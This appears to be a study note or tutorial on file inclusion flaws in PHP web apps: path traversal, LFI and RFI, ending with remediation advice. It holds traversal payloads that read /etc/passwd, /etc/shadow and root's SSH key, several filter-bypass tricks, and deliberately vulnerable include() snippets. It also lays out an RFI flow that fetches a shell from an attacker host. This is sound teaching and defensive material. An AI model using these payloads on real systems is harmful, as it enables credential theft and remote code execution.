# File Inclusion Vulnerabilities

## 🔍 Overview

**File inclusion vulnerabilities** occur when user-controlled input is passed into file-loading functions without proper validation or sanitisation — allowing an attacker to make the server read, execute, or expose files it shouldn't.

| Vulnerability | What It Does |
|--------------|-------------|
| **Path Traversal** | Read arbitrary files from the server's filesystem |
| **LFI** (Local File Inclusion) | Include and potentially execute local files via PHP include functions |
| **RFI** (Remote File Inclusion) | Include and execute files hosted on an attacker-controlled external server |

**Impact:** sensitive data leakage (source code, credentials, SSH keys), remote code execution (RCE), XSS, DoS.

> **How it arises:** Web apps accept file paths or names as URL parameters to load content dynamically. If that parameter isn't validated, the attacker controls which file gets loaded.
> ```
> http://webapp.com/get.php?file=userCV.pdf   ← legitimate
> http://webapp.com/get.php?file=../../../../etc/passwd  ← attack
> ```

---

## 📂 Path Traversal

Also called **directory traversal**. Allows an attacker to read OS-level files on the server by manipulating the file path parameter — using `../` sequences to escape the intended directory.

> **`../`** moves one directory up. Chaining multiple `../../../` sequences climbs up to the filesystem root, from which any file can be targeted.

### Linux Examples

```
http://webapp.thm/get.php?file=../../../../etc/passwd
http://webapp.thm/get.php?file=../../../../root/.ssh/id_rsa
```

### Windows Examples

```
http://webapp.thm/get.php?file=../../../../boot.ini
http://webapp.thm/get.php?file=../../../../windows/win.ini
```

### Common Target Files

| File | Contents |
|------|---------|
| `/etc/passwd` | Registered users with access to the system |
| `/etc/shadow` | Hashed user passwords |
| `/etc/issue` | System identification message shown before login |
| `/etc/profile` | Default environment variables for all users |
| `/proc/version` | Linux kernel version |
| `/root/.bash_history` | Command history for the root user |
| `/root/.ssh/id_rsa` | Root user's private SSH key |
| `/var/log/apache2/access.log` | Apache web server access log — useful for log poisoning |
| `/var/mail/root` | Root user's emails |
| `/var/log/dmessage` | Global system messages including boot logs |
| `C:\boot.ini` | Windows boot options (BIOS firmware systems) |

---

## 📥 Local File Inclusion (LFI)

**LFI** exploits PHP file-including functions (`include`, `require`, `include_once`, `require_once`) that accept user-controlled input — causing the server to read and potentially execute local files.

---

### Scenario 1 — No Input Validation

```php
<?php
    include($_GET["lang"]);
?>
```

The `lang` parameter is passed directly into `include`. Any file path is accepted:

```
# Intended
http://webapp.thm/index.php?lang=EN.php

# Attack — read /etc/passwd
http://webapp.thm/index.php?lang=/etc/passwd
```

---

### Scenario 2 — Directory Prefix in Include

```php
<?php
    include("languages/" . $_GET["lang"]);
?>
```

A directory prefix is prepended — but without validation, `../` sequences escape it:

```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```

---

### Scenario 3 — Black Box Testing (No Source Code)

Trigger an error with invalid input to leak internal path information:

```
http://webapp.thm/index.php?lang=THM

Error: include(languages/THM.php): failed to open stream: No such file or directory
       in /var/www/html/THM-4/index.php on line 12
```

The error reveals:
- The include function appends `.php` automatically
- The full server path: `/var/www/html/THM-4/`

**Bypass — Null Byte injection (`%00`):**

```
http://webapp.thm/index.php?lang=../../../../etc/passwd%00
```

The null byte (`%00`) terminates the string before `.php` is appended:

```php
include("languages/../../../../etc/passwd%00") . ".php"
// Interpreted as: include("languages/../../../../etc/passwd")
```

> **Note:** Null byte injection is patched in PHP 5.4+ — it works against older or unpatched systems.

---

### Scenario 4 — Keyword Filtering (`/etc/passwd` blocked)

The application filters specific keywords. Bypass techniques:

| Bypass | Payload |
|--------|---------|
| **Null byte** | `?lang=/etc/passwd%00` |
| **Dot trick** (stay in same dir) | `?lang=/etc/passwd/.` — resolves to `/etc/passwd` |

---

### Scenario 5 — `../` Filtered (Replaced with Empty String)

```
Error: include(languages/etc/passwd) — the ../ was stripped
```

**Bypass — double `../` (`....//`):**

```
http://webapp.thm/index.php?lang=....//....//....//....//etc/passwd
```

After the filter strips `../` from `....//`, what remains is `../` — the traversal still works.

---

### Scenario 6 — Fixed Directory in Parameter

```
http://webapp.thm/index.php?lang=languages/EN.php
```

The directory is included in the parameter itself. Include the required prefix in the payload:

```
http://webapp.thm/index.php?lang=languages/../../../../etc/passwd
```

---

## 🌐 Remote File Inclusion (RFI)

**RFI** goes further than LFI — instead of reading a local file, the server fetches and executes a file from an attacker-controlled external server. This typically leads directly to **Remote Code Execution (RCE)**.

> **Requirement:** The PHP option `allow_url_fopen` must be enabled on the server (it is off by default in modern PHP configurations).

### Attack Flow

```
1. Attacker hosts a malicious PHP file on their own server
   http://attacker.thm/shell.php
   → Contents: <?php echo "Hello THM"; ?>  (or a reverse shell)

2. Attacker injects the URL into the vulnerable parameter
   http://webapp.thm/index.php?lang=http://attacker.thm/shell.php

3. The vulnerable app passes the URL into include() without validation
   include("http://attacker.thm/shell.php");

4. The web server sends a GET request to the attacker's server to fetch the file

5. The fetched file is executed on the vulnerable web server
   → Code runs with the web server's privileges
```

> **RFI vs LFI:** LFI reads files that already exist on the server. RFI fetches and executes attacker-supplied code from outside — making it far more dangerous. RFI with a reverse shell payload gives the attacker interactive command execution on the server.

---

## 🛡️ Remediation

| Control | Description |
|---------|-------------|
| **Input validation** | Validate all user-supplied file paths against a strict allowlist — reject anything unexpected |
| **Whitelist file names and locations** | Only allow access to explicitly permitted files in permitted directories — deny everything else |
| **Disable dangerous PHP options** | Turn off `allow_url_fopen` and `allow_url_include` if remote file loading is not required |
| **Turn off PHP error messages** | Suppress verbose errors in production — they leak internal paths and logic to attackers |
| **Keep systems and services updated** | Patch PHP and web server software to prevent exploitation of known bypass techniques |
| **Deploy a WAF** | A Web Application Firewall can detect and block common path traversal and LFI/RFI payloads |
| **Allow only required PHP wrappers** | Restrict which PHP stream wrappers are permitted — `php://`, `data://`, `expect://` are commonly abused |
| **Principle of least privilege** | Run the web server process with the minimum filesystem permissions needed — limits what an attacker can read even if LFI succeeds |
